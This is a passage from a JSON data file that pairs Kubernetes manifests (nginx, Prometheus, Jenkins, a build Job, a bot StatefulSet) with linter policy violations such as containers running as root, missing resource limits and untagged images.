    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: auth\nspec:\n  ports:\n  - name: '8000'\n    port: 8000\n  selector:\n    app: auth\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:auth])"
  },
  {
    "id": "9652",
    "manifest_path": "data/manifests/the_stack_sample/sample_3697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:mainline-alpine\n        name: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: nginx-conf\n          mountPath: /etc/nginx/conf.d\n        resources:\n          requests:\n            memory: 10Mi\n      volumes:\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: cloud.google.com/gke-preemptible\n                operator: DoesNotExist\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9653",
    "manifest_path": "data/manifests/the_stack_sample/sample_3697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:mainline-alpine\n        name: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: nginx-conf\n          mountPath: /etc/nginx/conf.d\n        resources:\n          requests:\n            memory: 10Mi\n      volumes:\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: cloud.google.com/gke-preemptible\n                operator: DoesNotExist\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9654",
    "manifest_path": "data/manifests/the_stack_sample/sample_3697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:mainline-alpine\n        name: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: nginx-conf\n          mountPath: /etc/nginx/conf.d\n        resources:\n          requests:\n            memory: 10Mi\n      volumes:\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: cloud.google.com/gke-preemptible\n                operator: DoesNotExist\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9655",
    "manifest_path": "data/manifests/the_stack_sample/sample_3697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: production\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:mainline-alpine\n        name: nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: nginx-conf\n          mountPath: /etc/nginx/conf.d\n        resources:\n          requests:\n            memory: 10Mi\n      volumes:\n      - name: nginx-conf\n        configMap:\n          name: nginx-conf\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: cloud.google.com/gke-preemptible\n                operator: DoesNotExist\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9656",
    "manifest_path": "data/manifests/the_stack_sample/sample_3699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"fluxcdbot\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9657",
    "manifest_path": "data/manifests/the_stack_sample/sample_3699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "mismatching-selector",
    "violation_text": "labels in pod spec (map[]) do not match labels in selector (&LabelSelector{MatchLabels:map[string]string{app.kubernetes.io/name: fluxcdbot,},MatchExpressions:[]LabelSelectorRequirement{},})"
  },
  {
    "id": "9658",
    "manifest_path": "data/manifests/the_stack_sample/sample_3699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fluxcdbot\" does not have a read-only root file system"
  },
  {
    "id": "9659",
    "manifest_path": "data/manifests/the_stack_sample/sample_3699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fluxcdbot\" is not set to runAsNonRoot"
  },
  {
    "id": "9660",
    "manifest_path": "data/manifests/the_stack_sample/sample_3699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fluxcdbot\" has cpu request 0"
  },
  {
    "id": "9661",
    "manifest_path": "data/manifests/the_stack_sample/sample_3699.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fluxcdbot\" has memory limit 0"
  },
  {
    "id": "9662",
    "manifest_path": "data/manifests/the_stack_sample/sample_3701.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: build\nspec:\n  template:\n    spec:\n      volumes:\n      - name: github-ssh-key\n        secret:\n          secretName: github\n          defaultMode: 384\n      - name: npm-secrets\n        secret:\n          secretName: npm\n          defaultMode: 384\n      containers:\n      - name: build\n        image: agolub/design-system-builder:0.1.0\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: github-ssh-key\n          readOnly: true\n          mountPath: /root/.ssh\n        - name: npm-secrets\n          readOnly: true\n          mountPath: /usr/src/secrets\n        env:\n        - name: GITHUB_ACCESS_TOKEN\n          value: ''\n        - name: DOCS_API_KEY\n          value: ''\n        - name: JENKINS_JOB_TOKEN\n          value: ''\n        - name: JENKINS_API_TOKEN\n          value: ''\n        - name: RELEASE_INCREMENT\n          value: ''\n        - name: DRY_RUN\n          value: ''\n        command:\n        - /bin/bash\n        - run.sh\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "9663",
    "manifest_path": "data/manifests/the_stack_sample/sample_3701.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: build\nspec:\n  template:\n    spec:\n      volumes:\n      - name: github-ssh-key\n        secret:\n          secretName: github\n          defaultMode: 384\n      - name: npm-secrets\n        secret:\n          secretName: npm\n          defaultMode: 384\n      containers:\n      - name: build\n        image: agolub/design-system-builder:0.1.0\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: github-ssh-key\n          readOnly: true\n          mountPath: /root/.ssh\n        - name: npm-secrets\n          readOnly: true\n          mountPath: /usr/src/secrets\n        env:\n        - name: GITHUB_ACCESS_TOKEN\n          value: ''\n        - name: DOCS_API_KEY\n          value: ''\n        - name: JENKINS_JOB_TOKEN\n          value: ''\n        - name: JENKINS_API_TOKEN\n          value: ''\n        - name: RELEASE_INCREMENT\n          value: ''\n        - name: DRY_RUN\n          value: ''\n        command:\n        - /bin/bash\n        - run.sh\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"build\" does not have a read-only root file system"
  },
  {
    "id": "9664",
    "manifest_path": "data/manifests/the_stack_sample/sample_3701.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: build\nspec:\n  template:\n    spec:\n      volumes:\n      - name: github-ssh-key\n        secret:\n          secretName: github\n          defaultMode: 384\n      - name: npm-secrets\n        secret:\n          secretName: npm\n          defaultMode: 384\n      containers:\n      - name: build\n        image: agolub/design-system-builder:0.1.0\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: github-ssh-key\n          readOnly: true\n          mountPath: /root/.ssh\n        - name: npm-secrets\n          readOnly: true\n          mountPath: /usr/src/secrets\n        env:\n        - name: GITHUB_ACCESS_TOKEN\n          value: ''\n        - name: DOCS_API_KEY\n          value: ''\n        - name: JENKINS_JOB_TOKEN\n          value: ''\n        - name: JENKINS_API_TOKEN\n          value: ''\n        - name: RELEASE_INCREMENT\n          value: ''\n        - name: DRY_RUN\n          value: ''\n        command:\n        - /bin/bash\n        - run.sh\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"build\" is not set to runAsNonRoot"
  },
  {
    "id": "9665",
    "manifest_path": "data/manifests/the_stack_sample/sample_3701.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: build\nspec:\n  template:\n    spec:\n      volumes:\n      - name: github-ssh-key\n        secret:\n          secretName: github\n          defaultMode: 384\n      - name: npm-secrets\n        secret:\n          secretName: npm\n          defaultMode: 384\n      containers:\n      - name: build\n        image: agolub/design-system-builder:0.1.0\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: github-ssh-key\n          readOnly: true\n          mountPath: /root/.ssh\n        - name: npm-secrets\n          readOnly: true\n          mountPath: /usr/src/secrets\n        env:\n        - name: GITHUB_ACCESS_TOKEN\n          value: ''\n        - name: DOCS_API_KEY\n          value: ''\n        - name: JENKINS_JOB_TOKEN\n          value: ''\n        - name: JENKINS_API_TOKEN\n          value: ''\n        - name: RELEASE_INCREMENT\n          value: ''\n        - name: DRY_RUN\n          value: ''\n        command:\n        - /bin/bash\n        - run.sh\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"build\" has cpu request 0"
  },
  {
    "id": "9666",
    "manifest_path": "data/manifests/the_stack_sample/sample_3701.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: build\nspec:\n  template:\n    spec:\n      volumes:\n      - name: github-ssh-key\n        secret:\n          secretName: github\n          defaultMode: 384\n      - name: npm-secrets\n        secret:\n          secretName: npm\n          defaultMode: 384\n      containers:\n      - name: build\n        image: agolub/design-system-builder:0.1.0\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: github-ssh-key\n          readOnly: true\n          mountPath: /root/.ssh\n        - name: npm-secrets\n          readOnly: true\n          mountPath: /usr/src/secrets\n        env:\n        - name: GITHUB_ACCESS_TOKEN\n          value: ''\n        - name: DOCS_API_KEY\n          value: ''\n        - name: JENKINS_JOB_TOKEN\n          value: ''\n        - name: JENKINS_API_TOKEN\n          value: ''\n        - name: RELEASE_INCREMENT\n          value: ''\n        - name: DRY_RUN\n          value: ''\n        command:\n        - /bin/bash\n        - run.sh\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"build\" has memory limit 0"
  },
  {
    "id": "9667",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"prometheus\" is using an invalid container image, \"prom/prometheus\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9668",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"volume-permission-fix\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9669",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus\" does not have a read-only root file system"
  },
  {
    "id": "9670",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"volume-permission-fix\" does not have a read-only root file system"
  },
  {
    "id": "9671",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prometheus\" is not set to runAsNonRoot"
  },
  {
    "id": "9672",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"volume-permission-fix\" is not set to runAsNonRoot"
  },
  {
    "id": "9673",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prometheus\" has cpu request 0"
  },
  {
    "id": "9674",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"volume-permission-fix\" has cpu request 0"
  },
  {
    "id": "9675",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus\" has memory limit 0"
  },
  {
    "id": "9676",
    "manifest_path": "data/manifests/the_stack_sample/sample_3703.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      initContainers:\n      - name: volume-permission-fix\n        image: busybox\n        command:\n        - /bin/chmod\n        - -R\n        - '777'\n        - /mnt/data\n        volumeMounts:\n        - name: persistent-storage-prometheus\n          mountPath: /mnt/data\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"volume-permission-fix\" has memory limit 0"
  },
  {
    "id": "9677",
    "manifest_path": "data/manifests/the_stack_sample/sample_3704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jenkins\n  namespace: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jenkins-server\n  template:\n    metadata:\n      labels:\n        app: jenkins-server\n    spec:\n      securityContext:\n        fsGroup: 1000\n        runAsUser: 1000\n      serviceAccountName: jenkins-admin\n      containers:\n      - name: jenkins\n        image: jenkins4eval/jenkins:latest\n        env:\n        - name: JAVA_OPTS\n          value: -Dorg.csanchez.jenkins.plugins.kubernetes.pipeline.ContainerExecDecorator.websocketConnectionTimeout=1000\n        resources:\n          limits:\n            memory: 1Gi\n            cpu: 1000m\n          requests:\n            memory: 500Mi\n            cpu: 500m\n        ports:\n        - name: httpport\n          containerPort: 8080\n        - name: jnlpport\n          containerPort: 50000\n        volumeMounts:\n        - name: jenkins-data\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: jenkins-data\n        persistentVolumeClaim:\n          claimName: jenkins-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"jenkins\" is using an invalid container image, \"jenkins4eval/jenkins:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9678",
    "manifest_path": "data/manifests/the_stack_sample/sample_3704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jenkins\n  namespace: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jenkins-server\n  template:\n    metadata:\n      labels:\n        app: jenkins-server\n    spec:\n      securityContext:\n        fsGroup: 1000\n        runAsUser: 1000\n      serviceAccountName: jenkins-admin\n      containers:\n      - name: jenkins\n        image: jenkins4eval/jenkins:latest\n        env:\n        - name: JAVA_OPTS\n          value: -Dorg.csanchez.jenkins.plugins.kubernetes.pipeline.ContainerExecDecorator.websocketConnectionTimeout=1000\n        resources:\n          limits:\n            memory: 1Gi\n            cpu: 1000m\n          requests:\n            memory: 500Mi\n            cpu: 500m\n        ports:\n        - name: httpport\n          containerPort: 8080\n        - name: jnlpport\n          containerPort: 50000\n        volumeMounts:\n        - name: jenkins-data\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: jenkins-data\n        persistentVolumeClaim:\n          claimName: jenkins-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jenkins\" does not have a read-only root file system"
  },
  {
    "id": "9679",
